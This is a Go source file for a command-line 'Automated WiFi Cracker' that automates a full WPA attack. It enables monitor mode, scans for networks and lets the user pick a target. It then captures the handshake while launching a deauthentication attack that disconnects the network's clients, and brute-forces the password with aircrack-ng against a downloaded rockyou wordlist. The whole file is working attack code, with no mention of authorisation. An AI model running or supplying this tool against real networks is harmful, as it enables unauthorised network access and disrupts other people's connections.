package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/fatih/color"
)

type Network struct {
	BSSID  string
	CH     string
	ESSID  string
	Sec    string
	Client string
}

// Color definitions
var (
	cyan   = color.New(color.FgCyan, color.Bold)
	green  = color.New(color.FgGreen, color.Bold)
	yellow = color.New(color.FgYellow, color.Bold)
	red    = color.New(color.FgRed, color.Bold)
	white  = color.New(color.FgWhite, color.Bold)
)

func main() {
	// 1. Root check
	if os.Geteuid() != 0 {
		red.Println("[!] ERROR: This tool requires root privileges. Please run with 'sudo'.")
		os.Exit(1)
	}

	cyan.Println("=======================================")
	cyan.Println("    Automated WiFi Cracker CLI v3.0   ")
	cyan.Println("=======================================")

	// 2. Auto Environment Setup & Optimization
	setupEnvironment()

	reader := bufio.NewReader(os.Stdin)

	// 3. Interface Input
	white.Print("\n[*] Enter Wireless Interface (e.g., wlp1s0): ")
	iface, _ := reader.ReadString('\n')
	iface = strings.TrimSpace(iface)
	monIface := iface + "mon"

	yellow.Println("\n[*] Enabling Monitor Mode...")
	runCmd("airmon-ng", "check", "kill")
	runCmd("airmon-ng", "start", iface)
	green.Println("[+] Monitor Mode enabled successfully.")

	// 4. Scanning Networks
	yellow.Println("\n[*] Scanning networks for 15 seconds...")
	scanFile := "scan_temp"
	airodumpCmd := exec.Command("airodump-ng", monIface, "-w", scanFile, "--output-format", "csv")
	airodumpCmd.Stdout = nil
	airodumpCmd.Stderr = nil
	airodumpCmd.Start()
	time.Sleep(15 * time.Second)
	airodumpCmd.Process.Kill()
	green.Println("[+] Scan completed.")

	networks := parseCSV(scanFile + "-01.csv")
	if len(networks) == 0 {
		red.Println("[-] ERROR: No networks found or CSV file not generated.")
		os.Exit(1)
	}

	fmt.Println()
	cyan.Println("=== Discovered WiFi Networks ===")
	for i, net := range networks {
		fmt.Printf("[%d] ESSID: %s | BSSID: %s | CH: %s | Security: %s\n", i+1, net.ESSID, net.BSSID, net.CH, net.Sec)
	}

	// 5. Target Selection
	white.Print("\n[*] Enter the number of the target network: ")
	var choice int
	fmt.Scanf("%d", &choice)

	if choice < 1 || choice > len(networks) {
		red.Println("[-] ERROR: Invalid selection.")
		os.Exit(1)
	}
	target := networks[choice-1]

	yellow.Printf("\n[*] Target Selected: %s (%s)\n", target.ESSID, target.BSSID)

	// 6. Directory Structure Creation (data/wifi-name)
	sanitizedEssid := strings.ReplaceAll(target.ESSID, " ", "_")
	targetDir := filepath.Join("data", sanitizedEssid)

	yellow.Printf("[*] Creating directory for target: %s\n", targetDir)
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		red.Printf("[-] ERROR: Failed to create directory: %v\n", err)
		os.Exit(1)
	}
	green.Println("[+] Directory ready.")

	// Set capture file path inside the new directory
	capFile := filepath.Join(targetDir, "handshake")

	// 7. Handshake Capture & Deauth Attack
	yellow.Println("[*] Starting Handshake Capture...")
	captureCmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, "-w", capFile, monIface)
	captureCmd.Stdout = nil
	captureCmd.Stderr = nil
	captureCmd.Start()

	time.Sleep(2 * time.Second) // Wait for airodump to lock channel
	yellow.Println("[*] Launching Deauth Attack (10 seconds)...")

	deauthArgs := []string{"--deauth", "10", "-a", target.BSSID, monIface}
	if target.Client != "" {
		deauthArgs = append(deauthArgs, "-c", target.Client)
	}
	runCmd("aireplay-ng", deauthArgs...)

	time.Sleep(5 * time.Second) // Wait for handshake to save
	captureCmd.Process.Kill()
	green.Println("[+] Capture phase completed.")

	// 8. Password Cracking (Optimized)
	finalCapFile := capFile + "-01.cap"
	cores := runtime.NumCPU()

	cyan.Println("\n=======================================")
	cyan.Println("       Starting Password Cracking      ")
	cyan.Println("=======================================")
	yellow.Printf("[*] File: %s\n", finalCapFile)
	yellow.Printf("[*] Wordlist: rockyou_clean.txt (Passwords < 8 chars removed)\n")
	yellow.Printf("[*] CPU Threads: %d (Multi-threading Enabled)\n", cores)
	fmt.Println()

	runCmd("aircrack-ng", "-p", fmt.Sprintf("%d", cores), "-w", "/usr/share/wordlists/rockyou_clean.txt", finalCapFile)

	// Cleanup only the temporary scan file, KEEP the target files
	os.Remove("scan_temp-01.csv")

	green.Printf("\n[+] All files for '%s' are stored in: %s\n", target.ESSID, targetDir)
	red.Println("\n[!] IMPORTANT: Run 'sudo systemctl start NetworkManager' to restore your internet connection.")
}

// ================= Auto Setup & Optimization Function =================
func setupEnvironment() {
	yellow.Println("\n[*] Checking environment dependencies...")

	// Check aircrack-ng
	if _, err := exec.LookPath("aircrack-ng"); err != nil {
		red.Println("[-] aircrack-ng not found. Installing...")
		runCmd("apt", "update")
		runCmd("apt", "install", "aircrack-ng", "-y")
	} else {
		green.Println("[+] aircrack-ng is already installed.")
	}

	// Check wget
	if _, err := exec.LookPath("wget"); err != nil {
		red.Println("[-] wget not found. Installing...")
		runCmd("apt", "install", "wget", "-y")
	}

	// Check rockyou.txt
	wordlistPath := "/usr/share/wordlists/rockyou.txt"
	if _, err := os.Stat(wordlistPath); os.IsNotExist(err) {
		red.Println("[-] rockyou.txt not found. Downloading (130MB)...")
		runCmd("mkdir", "-p", "/usr/share/wordlists")
		runCmd("wget", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", "-O", wordlistPath)
		green.Println("[+] rockyou.txt downloaded successfully.")
	} else {
		green.Println("[+] rockyou.txt is already downloaded.")
	}

	// Optimization: Create Clean Wordlist (length >= 8)
	cleanWordlistPath := "/usr/share/wordlists/rockyou_clean.txt"
	if _, err := os.Stat(cleanWordlistPath); os.IsNotExist(err) {
		yellow.Println("[*] Optimizing Wordlist: Removing passwords shorter than 8 characters...")
		cleanFile, _ := os.Create(cleanWordlistPath)
		defer cleanFile.Close()

		awkCmd := exec.Command("awk", "length>=8", wordlistPath)
		awkCmd.Stdout = cleanFile
		awkCmd.Stderr = os.Stderr
		awkCmd.Run()
		green.Println("[+] Optimization complete. 'rockyou_clean.txt' created.")
	} else {
		green.Println("[+] Optimized wordlist 'rockyou_clean.txt' is ready.")
	}
}

// ================= Helper Functions =================
func runCmd(name string, args ...string) {
	cmd := exec.Command(name, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
}

func parseCSV(filename string) []Network {
	file, err := os.Open(filename)
	if err != nil {
		return nil
	}
	defer file.Close()

	var networks []Network
	scanner := bufio.NewScanner(file)
	isStation := false

	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "Station MAC") {
			isStation = true
			continue
		}

		parts := strings.Split(line, ",")
		if len(parts) < 14 {
			continue
		}

		if !isStation {
			bssid := strings.TrimSpace(parts[0])
			ch := strings.TrimSpace(parts[3])
			sec := strings.TrimSpace(parts[5])
			essid := strings.TrimSpace(parts[13])
			if bssid != "" && essid != "" {
				networks = append(networks, Network{
					BSSID: bssid,
					CH:    ch,
					ESSID: essid,
					Sec:   sec,
				})
			}
		} else {
			stationMac := strings.TrimSpace(parts[0])
			targetBSSID := strings.TrimSpace(parts[5])
			for i := range networks {
				if networks[i].BSSID == targetBSSID && networks[i].Client == "" {
					networks[i].Client = stationMac
					break
				}
			}
		}
	}
	return networks
}
